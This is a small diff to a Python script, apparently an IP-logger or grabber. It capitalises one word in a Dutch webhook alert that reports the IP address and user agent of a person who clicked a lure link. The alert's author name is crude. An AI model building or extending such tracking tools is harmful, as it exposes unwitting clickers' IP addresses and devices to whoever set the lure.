@@ -44,7 +44,7 @@ def prev(ip,uag):
     {
       "title": "Krypt0n1te Alert!",
       "color": 16711803,
-      "description": f"Hij Heeft Er Weer Op Ge Klikt Verwacht Die Ip maar al.\n\n**IP:** `{ip}`\n**UserAgent:** `Zie Dit Dan!`\n```yaml\n{uag}```",
+      "description": f"Hij Heeft Er Weer Op Ge Klikt Verwacht Die Ip Maar Al.\n\n**IP:** `{ip}`\n**UserAgent:** `Zie Dit Dan!`\n```yaml\n{uag}```",
       "author": {
         "name": "Big Dick Randy"
       },
